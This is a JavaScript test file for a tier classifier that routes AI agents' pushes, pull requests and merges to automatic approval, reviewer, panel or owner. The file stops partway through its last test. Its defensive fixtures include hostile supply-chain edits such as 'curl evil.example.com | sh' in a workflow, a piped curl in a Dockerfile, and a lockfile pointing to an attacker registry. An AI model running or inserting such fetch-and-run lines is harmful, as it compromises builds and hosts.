// The tier table, row by row, from verified state; plus the four real rejects of 2026-11-10/11.
import { test } from "node:test";
import assert from "node:assert/strict";
import YAML from "yaml";
import { classify, dependabotCommits, newGrants, priorDecisions, rejectedSince, routineCap } from "../src/tiers.mjs";
import { origins } from "../src/paperclip.mjs";

test("a replayed approval: only a later no on its branches (or a merge, or the owner's veto) outranks it", () => {
  const b = { repo: "acme/aidenhq", branch: "fix/a" };
  const no = (branch, over = {}) => ({ action: "pr", args: { merge: true, only: [{ repo: "acme/aidenhq", branch, sha: "f".repeat(40) }] }, state: "rejected", decidedBy: "reviewer:~openai/gpt-luna-latest", decidedAt: "2026-11-14T02:00:00Z", ...over });
  assert.equal(rejectedSince([no("fix/a")], "pr", ["merge"], [b], "2026-11-14T01:00:00Z"), true, "this branch, later");
  assert.equal(rejectedSince([no("fix/other")], "pr", ["merge"], [b], "2026-11-14T01:00:00Z"), false, "another branch on the task (WOR-4253)");
  assert.equal(rejectedSince([no("fix/a", { decidedAt: "2026-11-13T00:00:00Z" })], "pr", ["merge"], [b], "2026-11-14T01:00:00Z"), false, "before the approval");
  assert.equal(rejectedSince([no("fix/a", { reviewCode: "refused_by_code" })], "pr", ["merge"], [b], ""), false, "code's refusal");
  assert.equal(rejectedSince([{ action: "merge", args: { prs: [] }, state: "rejected", decidedBy: "reviewer:x", decidedAt: "2026-11-14T02:00:00Z" }], "pr", ["merge"], [b], ""), true, "a rejected merge carries over");
  assert.equal(rejectedSince([no("fix/other", { decidedBy: "owner:board" })], "pr", ["merge"], [b], "2026-11-14T03:00:00Z"), true, "the owner's veto");
  // The same patch renamed onto another branch (the runner matches patches; rebuild passes the ids).
  assert.equal(rejectedSince([no("fix/renamed", { id: "A1" })], "pr", ["merge"], [b], "2026-11-14T01:00:00Z", new Set(["A1"])), true, "same patch, another name");
});

const base = { agentsOrg: "acme-agents", productRepo: "acme/aidenhq", instanceRepo: "acme-agents/aidenhq-instance", requester: { platform: false }, taskStatus: "in_progress" };
const branch = (over = {}) => ({ repo: "acme-agents/roadmap", branch: "feat/x", defaultBranch: "main", empty: false, files: ["src/a.ts"], ...over });
const pub = (action, b, over = {}) => classify(action, { ...base, branches: [branch(b)], ...over });
const merge = (p = {}, over = {}) => classify("merge", { ...base, prs: [{ repo: "acme-agents/roadmap", number: 3, files: ["src/a.ts"], checks: [{ name: "test", ok: true }], headMatches: true, ownHead: true, sensitive: false, ...p }], ...over });
const PIN_A = "a".repeat(40);
const PIN_B = "b".repeat(40);
const inst = (settings = {}, extra = "") => `product: ${PIN_A}\nmodules: [core]\nsettings:\n  owner_name: Sam\n  slack_post_channels: [C1]\n${Object.entries(settings).map(([k, v]) => `  ${k}: ${JSON.stringify(v)}\n`).join("")}${extra}`;
const apply = (files, b, h, over = {}) => classify("apply", { ...base, files, base: b, head: h, pin: null, roles: { "chief-of-staff": ["fleet-admin"] }, ownerStarted: true, trialNoTap: true, ...over });
const def = (o) => Object.entries(o).map(([k, v]) => `${k}: ${JSON.stringify(v)}`).join("\n");
/** "reject", 0, 1, "panel" (Tier 1 and a second reviewer) or 2 (the owner). */
const tierOf = (t) => (t.reject ? "reject" : t.panel ? "panel" : t.tier);

test("push and draft pr", () => {
  assert.equal(tierOf(pub("push", {})), 0, "ordinary agents-org branch");
  assert.equal(tierOf(pub("pr", {})), 0, "draft pr, agents org");
  assert.equal(tierOf(pub("push", { branch: "main" })), "panel", "default branch");
  assert.equal(tierOf(pub("push", { branch: "deploy", deployBranch: "deploy" })), "panel", "deploy branch");
  assert.equal(tierOf(pub("push", { empty: true })), 1, "empty repo: the first push lands on main");
  assert.equal(tierOf(pub("push", { files: [".github/workflows/ci.yml"] })), 1, ".github change");
  assert.equal(tierOf(pub("push", { repo: base.instanceRepo })), "reject", "instance repo");
  assert.equal(tierOf(pub("push", { repo: base.productRepo })), "reject", "product repo push from outside the Platform Engineer's line");
  assert.equal(tierOf(pub("pr", { repo: "acme/bor" })), 1, "pr outside the agents org");
  assert.equal(tierOf(pub("push", { repo: "acme/bor" })), 1, "push outside the agents org");
  assert.equal(tierOf(pub("push", {}, { productRepo: undefined })), 2, "product repo unknown: fail closed");
  assert.equal(tierOf(pub("push", { repo: "acme-agents/aidenhq-instance" }, { instanceRepo: undefined })), 2, "instance repo unknown: fail closed");
  assert.equal(tierOf(pub("pr", { repo: "acme/bor" }, { branches: [branch(), branch({ repo: "acme/bor" }), branch({ branch: "main" })] })), "panel", "mixed: the highest part");
});

test("raise_cap is always the owner's", () => assert.equal(tierOf(classify("raise_cap", base)), 2));

// Owner, 2026-11-14: "sticky" replaced. The owner's no holds until their yes; the reviewer's no holds for the same content,
// a changed request is reviewed afresh with its notes, and retries of one target are bounded.
test("earlier decisions: owner veto, same content, bounded retries per target", () => {
  const SHA = (c) => c.repeat(40);
  // Each commit's patch key here is its own (no rebases) unless a case says otherwise.
  const pk = (sha) => (sha + sha).slice(0, 64);
  const rec = (state, by, sha, at, over = {}) => ({ action: "pr", args: { only: [{ repo: "acme-agents/roadmap", branch: "feat/x", sha, patch: pk(sha) }] }, state, decidedBy: by, decidedAt: `2026-11-14T0${at}:00:00Z`, review: `note ${at}`, ...over });
  const at = (records, sha = SHA("f"), b = {}) => pub("pr", { sha, patch: pk(sha), ...b }, { records });
  assert.equal(tierOf(at([rec("rejected", "reviewer:~openai/gpt-luna-latest", SHA("a"), 1)])), 0, "a reviewer's no on other content: reviewed (here Tier 0) afresh");
  assert.equal(at([rec("rejected", "reviewer:~openai/gpt-luna-latest", SHA("f"), 1)]).rule, "rejected-content", "the same commits stay rejected");
  // Two reviewers unsure: the same commits come back only once the request chain changed (no re-rolling the reviewers).
  const unsure = (requestChain) => [rec("rejected", "reviewer:~z-ai/glm-flash-latest", SHA("f"), 1, { reviewCode: "reviewer_unsure", requestChain })];
  assert.equal(pub("pr", { sha: SHA("f"), patch: pk(SHA("f")) }, { records: unsure("c1"), requestChain: "c1" }).rule, "rejected-content", "same chain: still rejected");
  assert.equal(pub("pr", { sha: SHA("f"), patch: pk(SHA("f")) }, { records: unsure(undefined), requestChain: "c2" }).rule, "rejected-content", "chain unknown then: still rejected");
  assert.equal(tierOf(pub("pr", { sha: SHA("f"), patch: pk(SHA("f")) }, { records: unsure("c1"), requestChain: "c2" })), 0, "a changed chain: reviewed afresh");
  // Once per content: the relift carries the first round's note (its unsure goes to the owner); a second rejection of the
  // same commits, however the chain changed since, keeps them rejected.
  assert.equal(priorDecisions(unsure("c1"), "pr", [], SHA("f"), undefined, "c2").relift, "note 1");
  const twice = [...unsure("c1"), rec("rejected", "reviewer:~z-ai/glm-flash-latest", SHA("f"), 2, { reviewCode: "reviewer_unsure", requestChain: "c2" })];
  assert.equal(pub("pr", { sha: SHA("f"), patch: pk(SHA("f")) }, { records: twice, requestChain: "c3" }).rule, "rejected-content", "no second relift");
  assert.equal(tierOf(pub("pr", { sha: SHA("a"), patch: pk(SHA("a")) }, { records: twice, requestChain: "c3" })), 0, "changed commits: always a fresh review");
  assert.equal(tierOf(at([rec("rejected", "owner:board", SHA("a"), 1)])), 2, "the owner's no: their card");
  assert.equal(tierOf(at([rec("rejected", "owner:board", SHA("a"), 1), rec("approved", "owner:telegram", SHA("b"), 2)])), 0, "their later yes lifts it");
  // Bound to content: reject X, approve Y, resubmit X: still the owner's (the watcher decides as the owner too).
  const xy = [rec("rejected", "watcher", SHA("a"), 1), rec("approved", "watcher", SHA("b"), 2)];
  assert.deepEqual([tierOf(at(xy, SHA("a"))), at(xy, SHA("a")).rule], [2, "owner-veto"], "X again after Y's yes");
  assert.equal(tierOf(at([...xy, rec("approved", "owner:board", SHA("a"), 3)], SHA("a"))), 0, "until they approve X itself");
  // A watcher's no on a stale or duplicate card judged nothing: no veto, not a rejection of that content, no replay block.
  const stale = [rec("rejected", "stale:watcher", SHA("a"), 1)];
  assert.equal(tierOf(at(stale, SHA("a"))), 0, "a stale no: not the owner's veto, not a rejection");
  assert.equal(rejectedSince(stale, "pr", [], [{ repo: "acme-agents/roadmap", branch: "feat/x" }]), false, "nor does it block a replay");
  // By content, not commits: X rebased (new commit, same patch) is still vetoed; a missing patch key fails closed.
  const P = (c) => c.repeat(64);
  const withPatch = (r, p) => ({ ...r, args: { only: r.args.only.map((b) => ({ ...b, patch: p })) } });
  const xyP = [withPatch(rec("rejected", "watcher", SHA("a"), 1), P("1")), withPatch(rec("approved", "watcher", SHA("b"), 2), P("2"))];
  assert.equal(at(xyP, SHA("c"), { patch: P("1") }).rule, "owner-veto", "X rebased onto a new main");
  assert.equal(tierOf(at(xyP, SHA("c"), { patch: P("3") })), 0, "other content");
  assert.equal(at(xyP, SHA("c"), { patch: undefined }).rule, "owner-veto", "no patch key, and the owner rejected something here: theirs");
  const three = [1, 2, 3].map((i) => rec("rejected", "reviewer:~openai/gpt-luna-latest", SHA(String(i)), i));
  assert.equal(at(three).rule, "retries-exhausted", "parked after three");
  assert.equal(at(three.map((r) => ({ ...r, reviewCode: "refused_by_code" }))).rule, "agents-org-branch", "code's refusals (moved, unreadable) never count");
  // The reproduction: a judged rejection, a card closed for its moved head, then another card: two judged rejections, not parked.
  const judgedStaleJudged = [rec("rejected", "reviewer:~openai/gpt-luna-latest", SHA("a"), 1), rec("stale", "reviewer:~openai/gpt-luna-latest", SHA("b"), 2, { reviewCode: "stale_head" }), rec("rejected", "reviewer:~openai/gpt-luna-latest", SHA("c"), 3)];
  assert.equal(tierOf(at(judgedStaleJudged, SHA("d"))), 0, "a stale card spends no review slot");
  assert.equal(at([...judgedStaleJudged, rec("rejected", "reviewer:~openai/gpt-luna-latest", SHA("d"), 4)], SHA("e")).rule, "retries-exhausted", "three judged rejections still park");
  // The count is task-wide: only the owner's yes, or a later approval of a rejected change's exact content, clears it; a
  // Tier 0 audit row or an approval of other content never does, and a renamed branch doesn't start a new budget.
  assert.equal(at([...three, rec("approved", "reviewer:~openai/gpt-luna-latest", SHA("9"), 4)]).rule, "retries-exhausted", "an approval of other content");
  assert.equal(at([...three, rec("auto", "auto:agents-org-branch", SHA("9"), 4)]).rule, "retries-exhausted", "a Tier 0 audit row");
  assert.equal(at(three, SHA("f"), { branch: "feat/renamed" }).rule, "retries-exhausted", "a renamed branch");
  assert.equal(at([...three, rec("approved", "owner:board", SHA("9"), 4)]).rule, "agents-org-branch", "the owner's yes");
  assert.equal(at([...three, rec("approved", "reviewer:~openai/gpt-luna-latest", SHA("3"), 4)]).rule, "agents-org-branch", "a rejected change later approved no longer counts");
  assert.equal(at([rec("rejected", "reviewer:~openai/gpt-luna-latest", SHA("f"), 1)], SHA("f"), { branch: "feat/renamed" }).rule, "rejected-content", "the same commit under another branch name");
  // A merge-carrying PR card counts for a plain merge, and the other way round.
  const m = merge({}, { records: [{ action: "pr", args: { merge: true, only: [] }, state: "rejected", decidedBy: "owner:board", decidedAt: "2026-11-14T01:00:00Z" }] });
  assert.equal(m.rule, "owner-veto");
});

test("grants: a destructive tool named where `write` was is wider, by its tag, not its name", () => {
  const conns = { files: { tools: { read: ["f_get"], write: ["f_put"], destructive: ["f_wipe"] } } };
  assert.deepEqual(newGrants({ files: "write" }, { files: ["f_get", "f_wipe"] }, conns), ["files"], "f_wipe is tagged destructive");
  assert.deepEqual(newGrants({ files: "write" }, { files: ["f_get", "f_put"] }, conns), [], "a narrower list");
  assert.deepEqual(newGrants({ files: "write" }, { files: ["f_get"] }, {}), ["files"], "tags unknown: fail closed");
  const agent = (g) => def({ name: "K", description: "d", model: "m", budget: 5, connections: { files: g } });
  assert.equal(tierOf(apply(["agents/k/agent.yaml"], { "agents/k/agent.yaml": agent("write") }, { "agents/k/agent.yaml": agent(["f_wipe"]) }, { connections: conns })), "panel", "on an apply");
});

test("a routine run's unparented task keeps the cap: traced through Paperclip's originRunId, not the parent", async () => {
  // r1's run worked on RUN-1 (the routine's run task) and created T-2 with no parent; T-2's Engineer delegation is T-3.
  const issues = {
    // A routine run task's originRunId is the routine run, not a heartbeat run: looking it up 404s.
    "run-1": { id: "run-1", originKind: "routine_execution", originId: "r1", originRunId: "routine-run-1" },
    "t-2": { id: "t-2", parentId: null, originRunId: "hb-1" },
    "t-3": { id: "t-3", parentId: "t-2", originRunId: "hb-2" },
  };
  const runs = { "hb-1": { issueId: "run-1" }, "hb-2": { issueId: "t-2" } };
  const pc = { issue: async (id) => issues[id], run: async (id) => runs[id] ?? Promise.reject(new Error("404 Heartbeat run not found")) };
  for (const t of ["t-2", "t-3"]) {
    const { issues: found, complete } = await origins(pc, issues[t]);
    assert.equal(routineCap(found, complete, { r1: "tier0" }), "tier0", `${t} keeps r1's cap`);
  }
  const own = await origins(pc, { id: "o-1", parentId: null });
  assert.equal(routineCap(own.issues, own.complete, { r1: "tier0" }), undefined, "the owner's own task: no cap");
});

test("a routine's autonomy caps the tasks its run started; changing it is the owner's", () => {
  const run = { originKind: "routine_execution", originId: "r1" };
  assert.equal(routineCap([{}, run], true, { r1: "tier0" }), "tier0", "a delegation under the run task");
  assert.equal(routineCap([run], true, {}), "off", "a routine the table doesn't know: fails closed");
  assert.equal(routineCap([run], true, { r1: "yes" }), "off", "an invalid value: fails closed");
  assert.equal(routineCap([run], true, { r1: "full" }), "full", "full: no cap");
  assert.equal(routineCap([{}, {}], true, {}), undefined, "no routine run: no cap");
  assert.equal(routineCap([{}], false, {}), "off", "a trace too long to finish: strictest");
  assert.equal(routineCap([{}, run, { originKind: "routine_execution", originId: "r2" }], true, { r1: "full", r2: "tier0" }), "tier0", "the strictest routine found");
  assert.equal(tierOf(pub("pr", { repo: "acme/bor" }, { routineAutonomy: "tier0" })), 2, "tier0: Tier 1 is the owner's");
  assert.equal(tierOf(pub("push", {}, { routineAutonomy: "tier0" })), 0, "tier0: Tier 0 still runs");
  assert.equal(tierOf(pub("push", {}, { routineAutonomy: "off" })), 2, "off: Tier 0 is the owner's too");
  assert.equal(tierOf(pub("pr", { repo: "acme/bor" }, { routineAutonomy: "full" })), 1, "full: no cap");
  const agent = (r) => def({ name: "K", description: "d", model: "m", budget: 5, routines: r });
  const r0 = { scan: { title: "S", schedules: [] } };
  assert.equal(tierOf(apply(["agents/k/agent.yaml"], { "agents/k/agent.yaml": agent(r0) }, { "agents/k/agent.yaml": agent({ scan: { ...r0.scan, autonomy: "full" } }) })), "panel", "an instance routine raising its own cap");
  assert.equal(tierOf(apply(["agents/k/agent.yaml"], { "agents/k/agent.yaml": agent(r0) }, { "agents/k/agent.yaml": agent({ scan: { ...r0.scan, schedules: [{ cron: "0 9 * * *" }] } }) })), 1, "a schedule change stays the reviewer's");
  assert.equal(tierOf(apply(["instance.yaml"], { "instance.yaml": inst() }, { "instance.yaml": inst({}, "overrides:\n  routines:\n    scan: { autonomy: full }\n") })), "panel", "an override of a routine's autonomy");
});

test("product repo PRs: platform only, gate files are the owner's", () => {
  assert.equal(tierOf(pub("pr", { repo: base.productRepo }, { requester: { platform: true } })), 1);
  assert.equal(tierOf(pub("pr", { repo: base.productRepo, files: ["services/runner/src/merges.mjs"] }, { requester: { platform: true } })), "panel");
  assert.equal(tierOf(pub("pr", { repo: base.productRepo, files: ["services/apps-mcp/src/agent-auth.ts"] }, { requester: { platform: true } })), "panel");
  assert.equal(tierOf(pub("pr", { repo: base.productRepo, files: ["ops/apply-config.sh"] }, { requester: { platform: true } })), "panel");
  assert.equal(tierOf(pub("pr", { repo: base.productRepo })), "reject", "any other requester");
});

// Owner, 2026-11-13: product writes are the reviewer's for the Platform Engineer's line unless they touch the actual gates.
const P = { requester: { platform: true }, roles: { "fleet-ops": ["fleet-read"] } };
const prod = (action, b = {}, over = {}) => pub(action, { repo: base.productRepo, ...b }, { ...P, ...over });
const yml = (o) => YAML.stringify(o);
const mod = (agents, extra = {}) => yml({ name: "m", agents, ...extra });
test("product repo: branch push, PR and merge are Tier 1 for the Platform Engineer's line", () => {
  assert.equal(tierOf(prod("push")), 1, "a branch push");
  assert.equal(tierOf(prod("push", { branch: "main" })), "reject", "the default branch");
  assert.equal(tierOf(prod("push", {}, { requester: { platform: false } })), "reject", "another agent's push stays the owner's");
  assert.equal(tierOf(prod("pr", { files: ["services/board/src/tasks.ts", "package-lock.json", "services/runner/src/prompt.mjs"] })), 1, "general code is not gate code");
  for (const g of ["services/runner/src/tiers.mjs", "modules/core/security/policy.md", "scripts/no-shell.mjs", "services/computer/launcher.mjs", "services/computer/plugin/worker.js", "services/computer/images/engineer/Dockerfile", "services/runner/src/main.mjs", "services/runner/src/engines.mjs", "services/runner/src/state.mjs", "services/runner/src/config.mjs", "services/runner/src/github-app.mjs", "scripts/paperclip-setup.mjs", "scripts/modules.mjs", "services/gateway/lib.mjs", "scripts/verify-security.sh", "scripts/supply-chain/npm-age.mjs", ".github/workflows/ci.yml", "services/board/src/approvals.ts", "modules/glean/connections/glean-mcp/src/agent-auth.ts"])
    assert.equal(tierOf(prod("pr", { files: ["package.json", g] })), "panel", g);
  assert.equal(tierOf(prod("pr", { files: ["modules/fleet-ops/agents/fleet-ops/AGENTS.md"] })), 1, "a role holder's handbook");
  assert.equal(tierOf(prod("pr", { files: ["modules/slack/agents/slack-scout/AGENTS.md"] })), 1, "a handbook of an agent without a role");
  const pm = (p = {}, over = {}) => merge({ repo: base.productRepo, ...p }, { ...P, ...over });
  assert.equal(tierOf(pm()), 1, "CI green on the exact head");
  assert.equal(tierOf(pm({ checks: [{ name: "test", ok: false, pending: true }] })), 1, "still running: the strict queue merges only once green");
  assert.equal(tierOf(pm({ checks: [{ name: "test", ok: false }] })), "reject", "red");
  assert.equal(tierOf(pm({ checks: [] })), "reject", "no checks");
  assert.equal(tierOf(pm({ headMatches: false })), "reject", "head moved");
  assert.equal(tierOf(pm({ ownHead: false })), 1, "a fork's or someone else's head");
  assert.equal(tierOf(pm({ files: ["package.json", "services/runner/src/review.mjs"] })), "panel", "gate code");
  assert.equal(tierOf(pm({}, { requester: { platform: false } })), "reject", "another agent's merge");
});

test("product repo: a bump that quietly edits a gate file is the owner's", () => {
  const files = ["services/whisper/requirements.txt", "services/runner/package-lock.json", "services/runner/src/review.mjs"];
  const t = prod("pr", { files });
  assert.equal(tierOf(t), "panel");
  assert.equal(t.rule, "gate-core");
  assert.match(t.reason, /review\.mjs/);
  // The gate's own core and anything that can bypass it: the panel. Other gate code: the reviewer alone (it may flag it).
  for (const f of ["services/runner/src/git.mjs", "services/runner/src/commands.mjs", "services/runner/src/engines.mjs", "services/runner/src/workspace.mjs", "services/runner/src/files.mjs", "scripts/computers.mjs", "services/runner/test/reviewer-cases/01-x.json", "services/runner/scripts/reviewer-eval.mjs", "services/board/src/fleet.ts"]) assert.equal(tierOf(prod("pr", { files: [f] })), "panel", f);
  for (const f of ["services/runner/src/primer.mjs"]) {
    assert.equal(prod("pr", { files: [f] }).rule, "product-gate", f);
    assert.equal(tierOf(prod("pr", { files: [f] })), 1, f);
  }
});

test("product repo: module.yaml and compose.yaml by content", () => {
  const f = "modules/m/module.yaml";
  const agent = { model: "a", reasoning_effort: "low", connections: { github: "read", paperclip_tasks: ["task_get"] }, roles: [] };
  const withText = (b, h) => prod("pr", { files: [f], texts: { [f]: { base: b, head: h } } });
  assert.equal(tierOf(withText(mod({ x: agent }), mod({ x: { ...agent, reasoning_effort: "high" } }, { description: "new words" }))), 1, "effort and text");
  assert.equal(tierOf(withText(mod({ x: agent }), mod({ x: { ...agent, connections: { ...agent.connections, github: "write" } } }))), "panel", "a wider grant");
  assert.equal(tierOf(withText(mod({ x: agent }), mod({ x: { ...agent, connections: { ...agent.connections, paperclip_tasks: ["task_get", "task_create"] } } }))), "panel", "a new tool");
  assert.equal(tierOf(withText(mod({ x: agent }), mod({ x: { ...agent, connections: { github: "read" } } }))), 1, "a narrower grant");
  assert.equal(tierOf(withText(mod({ x: agent }), mod({ x: { ...agent, model: "b" } }))), "panel", "a model");
  assert.equal(tierOf(withText(mod({ x: agent }), mod({ x: { ...agent, roles: ["fleet-admin"] } }))), "panel", "a role");
  assert.equal(tierOf(withText(mod({ x: agent }), mod({ x: agent, y: agent }))), "panel", "a new agent");
  assert.equal(tierOf(withText(mod({ x: agent }), mod({ x: agent }, { codex_args: ["--sandbox", "workspace-write"] }))), "panel", "the tool-only sandbox");
  assert.equal(tierOf(withText(mod({ x: agent }), mod({ x: agent }, { generated_secrets: ["k"] }))), "panel", "a credential");
  const conn = (tools, extra = {}) => mod({ x: agent }, { connections: { gh: { guide: "g", url: "http://gh:1/mcp", tools, ...extra } } });
  assert.equal(tierOf(withText(conn({ read: ["a"], write: ["b"] }), conn({ read: ["a"], write: ["b"] }, { guide: "better guide" }))), 1, "a connection's guide");
  assert.equal(tierOf(withText(conn({ read: ["a"], write: ["b"] }), conn({ read: ["a", "c"], write: ["b"] }))), "panel", "a new tool on a connection");
  assert.equal(tierOf(withText(conn({ read: ["a"], write: ["b"] }), conn({ read: [], write: ["a", "b"] }))), "panel", "a tool tagged write");
  const rt = (model) => mod({ x: agent }, { routines: { r: { agent: "x", schedules: [{ cron: "0 9 * * *" }], ...(model ? { model } : {}) } } });
  assert.equal(tierOf(withText(rt(), yml({ ...YAML.parse(rt()), routines: { r: { agent: "x", schedules: [{ cron: "0 10 * * *" }] } } }))), 1, "a schedule");
  assert.equal(tierOf(withText(rt(), rt("m2"))), "panel", "a routine model");
  assert.equal(tierOf(prod("pr", { files: [f] })), "reject", "content not read: the owner's");
  const compose = (image, extra = {}) => yml({ services: { tailscale: { image, network_mode: "host", ...extra } } });
  const c = (b, h) => prod("pr", { files: ["compose.yaml"], texts: { "compose.yaml": { base: b, head: h } } });
  assert.equal(tierOf(c(compose("tailscale/tailscale:v1.90.1@sha256:aa"), compose("tailscale/tailscale:v1.90.4@sha256:bb"))), 1, "an image bump");
  assert.equal(tierOf(c(compose("t:1"), compose("t:1", { volumes: ["/var/run/docker.sock:/var/run/docker.sock"] }))), "panel", "a new mount");
  assert.equal(tierOf(c(compose("tailscale/tailscale:v1.90.1"), compose("evil/tailscale:v1.90.1"))), "panel", "another image repository");
  assert.equal(tierOf(c(compose("t:1"), yml({ services: { tailscale: { image: "t:1", network_mode: "host" }, extra: { image: "x:1" } } }))), "panel", "a new service");
  // A module's compose fragment gets the same rules; unread, it is the owner's.
  const frag = "modules/glean/compose.yaml";
  const cf = (b, h) => prod("pr", { files: [frag], texts: { [frag]: { base: b, head: h } } });
  assert.equal(tierOf(cf(compose("g:1@sha256:aa"), compose("g:1@sha256:bb"))), 1, "a fragment's digest bump");
  assert.equal(tierOf(cf(compose("g:1"), compose("g:1", { privileged: true }))), "panel", "a fragment turns privileged");
  assert.equal(tierOf(cf(compose("g:1"), compose("g:1", { environment: { TOKEN: "x" } }))), "panel", "a fragment's env");
  assert.equal(tierOf(prod("pr", { files: [frag] })), "reject", "a fragment not read");
  assert.equal(tierOf(withText(mod({ x: agent }, { compose: "compose.yaml" }), mod({ x: agent }, { compose: "other.yaml" }))), "panel", "a module's compose path");
  assert.equal(tierOf(withText(mod({ x: agent }, { settings: { autonomy: { default: "off" } } }), mod({ x: agent }, { settings: { autonomy: { default: "full" } } }))), "panel", "a setting's default");
});

// Owner, 2026-11-13: a green, pin-only Dependabot PR on the product repo is the reviewer's; anything more is the owner's.
test("product repo: Dependabot pin-only merges are Tier 1, anything else Tier 2", () => {
  const SHA_A = "a".repeat(40);
  const SHA_B = "b".repeat(40);
  const wf = (sha, tag, run = "npm test") => `jobs:\n  test:\n    steps:\n      - uses: actions/checkout@${sha} # ${tag}\n      - run: ${run}\n`;
  const df = (from) => `FROM ${from} AS build\nRUN npm ci\n`;
  const pkg = (v, extra = {}) => JSON.stringify({ name: "x", scripts: { test: "node --test" }, dependencies: { yaml: v }, ...extra });
  const entry = (v, extra = {}) => ({ version: v, resolved: `https://registry.npmjs.org/yaml/-/yaml-${v}.tgz`, integrity: "sha512-x", ...extra });
  const lock = (v, extra = {}) => JSON.stringify({ name: "x", lockfileVersion: 3, packages: { "": { name: "x", dependencies: { yaml: v } }, "node_modules/yaml": entry(v, extra) } });
  const texts = {
    ".github/workflows/ci.yml": { base: wf(SHA_A, "v7.0.1"), head: wf(SHA_B, "v7.1.0") },
    "services/computer/images/engineer/Dockerfile": { base: df("node:24.10-bookworm@sha256:aa"), head: df("node:24.11-bookworm@sha256:bb") },
    "services/runner/package.json": { base: pkg("2.8.0"), head: pkg("2.8.1") },
    "services/runner/package-lock.json": { base: lock("2.8.0"), head: lock("2.8.1") },
    "compose.yaml": { base: YAML.stringify({ services: { t: { image: "tailscale/tailscale:v1.90.1@sha256:aa" } } }), head: YAML.stringify({ services: { t: { image: "tailscale/tailscale:v1.90.4@sha256:bb" } } }) },
  };
  const checks = [{ name: "supply-chain", ok: true }, { name: "services/runner", ok: true }];
  const dm = (p = {}, over = {}) => merge({ repo: base.productRepo, files: Object.keys(texts), texts, checks, ownHead: false, dependabot: true, ...p }, { ...P, ...over });
  const one = (f, b, h) => dm({ files: [f], texts: { [f]: { base: b, head: h } } });
  const ok = dm();
  assert.equal(tierOf(ok), 1, "pin-only, green, supply-chain green");
  assert.equal(ok.rule, "product-dependabot-merge");
  assert.equal(tierOf(dm({ dependabot: false })), "panel", "not verified as Dependabot's: today's foreign-head rule");
  assert.equal(tierOf(dm({}, { requester: { platform: false } })), "reject", "outside the Platform Engineer's line");
  assert.equal(tierOf(dm({ checks: [...checks.slice(0, 1), { name: "services/runner", ok: false, pending: true }] })), "panel", "a check still running");
  assert.equal(tierOf(dm({ checks: [{ name: "services/runner", ok: true }] })), "panel", "no supply-chain check");
  assert.equal(tierOf(dm({ checks: [{ name: "supply-chain", ok: false }] })), "reject", "supply-chain red");
  assert.equal(tierOf(dm({ headMatches: false })), "reject", "head moved");
  assert.equal(tierOf(one(".github/workflows/ci.yml", wf(SHA_A, "v7.0.1"), wf(SHA_B, "v7.1.0", "npm test && curl evil.example.com | sh"))), "panel", "a workflow `run:` change");
  assert.equal(tierOf(one(".github/workflows/ci.yml", wf(SHA_A, "v7.0.1"), wf(SHA_B, "v7.1.0").replace("actions/checkout", "evil/checkout"))), "panel", "another action");
  assert.equal(tierOf(one(".github/workflows/ci.yml", wf(SHA_A, "v6.0.0"), wf(SHA_B, "v7.0.0"))), "panel", "an action's major jump");
  assert.equal(tierOf(one("services/computer/images/engineer/Dockerfile", df("node:24.10-bookworm"), df("evil/node:24.10-bookworm"))), "panel", "a new image repository");
  assert.equal(tierOf(one("services/computer/images/engineer/Dockerfile", df("node:24-bookworm"), df("node:26-bookworm"))), "panel", "a base image's major jump");
  assert.equal(tierOf(one("services/computer/images/engineer/Dockerfile", df("node:24.10"), df("node:24.10").replace("RUN npm ci", "RUN npm ci && curl x | sh"))), "panel", "a RUN change");
  assert.equal(tierOf(one("services/runner/package.json", pkg("2.8.0"), pkg("3.0.0"))), 1, "a dependency's major jump");
  assert.equal(tierOf(one("services/runner/package.json", pkg("0.5.0"), pkg("0.6.0"))), 1, "0.x: a minor is a major");
  assert.equal(tierOf(one("services/runner/package.json", pkg("2.8.0"), pkg("2.8.1", { scripts: { postinstall: "node x" } }))), 1, "a script");
  assert.equal(tierOf(one("services/runner/package.json", pkg("2.8.0"), pkg("github:evil/yaml"))), 1, "a git source");
  assert.equal(tierOf(one("services/runner/package-lock.json", lock("2.8.0"), lock("2.8.1", { resolved: "https://evil.example.com/yaml.tgz" }))), 1, "another registry");
  assert.equal(tierOf(one("services/runner/package-lock.json", lock("2.8.0"), lock("2.8.1", { resolved: "https://registry.npmjs.org/evil-yaml/-/evil-yaml-2.8.1.tgz" }))), 1, "another package's tarball on the registry");
  assert.equal(tierOf(one("services/runner/package-lock.json", lock("2.8.0"), lock("2.8.1", { name: "evil-yaml", resolved: "https://registry.npmjs.org/evil-yaml/-/evil-yaml-2.8.1.tgz" }))), 1, "an alias");
  assert.equal(tierOf(one("services/runner/package-lock.json", lock("2.8.0"), lock("2.8.1", { inBundle: true }))), 1, "newly bundled");
  assert.equal(tierOf(one("services/runner/package-lock.json", lock("2.8.0"), lock("2.8.1", { hasInstallScript: true }))), 1, "a new install script");
  assert.equal(tierOf(one("services/runner/package-lock.json", lock("2.8.0"), "{not json")), 1, "unparseable");
  assert.equal(tierOf(one("compose.yaml", texts["compose.yaml"].base, YAML.stringify({ services: { t: { image: "tailscale/tailscale:v2.0.0" } } }))), 1, "a compose image's major jump");
  assert.equal(tierOf(one("services/runner/src/review.mjs", "a", "b")), "panel", "gate code that isn't a pin");
  assert.equal(tierOf(one("docs/x.md", "a", "b")), 1, "any other file");
  assert.equal(tierOf(dm({ texts: {} })), "reject", "files not read");
  // Which PRs count as Dependabot's (the runner reads the commits from the API): only Dependabot's GitHub-signed commits.
  const bot = (sha, over = {}) => ({ sha, author: "dependabot[bot]", committer: "web-flow", verified: true, ...over });
  assert.equal(dependabotCommits([bot("1"), bot("2")], "2"), true, "Dependabot's commits");
  assert.equal(dependabotCommits([bot("1"), bot("2", { author: "acme-aidenhq[bot]", committer: "acme-aidenhq[bot]", verified: false })], "2"), false, "a runner-pushed commit");
  assert.equal(dependabotCommits([bot("1", { committer: "someone", verified: false })], "1"), false, "a forged author email");
  assert.equal(dependabotCommits([bot("1")], "2"), false, "not ending at the head");
});

test("close", () => {
  const close = (p, over = {}) => classify("close", { ...base, prs: [p], ...over });
  assert.equal(tierOf(close({ repo: "acme-agents/roadmap" })), 0, "agents org");
  assert.equal(tierOf(close({ repo: base.productRepo, dependabot: true }, P)), 0, "a Dependabot PR on the product repo");
  assert.equal(tierOf(close({ repo: base.productRepo }, P)), "reject", "another product PR");
  assert.equal(tierOf(close({ repo: base.productRepo, dependabot: true })), "reject", "outside the Platform Engineer's line");
  assert.equal(tierOf(close({ repo: base.instanceRepo, dependabot: true }, P)), "reject", "the instance repo");
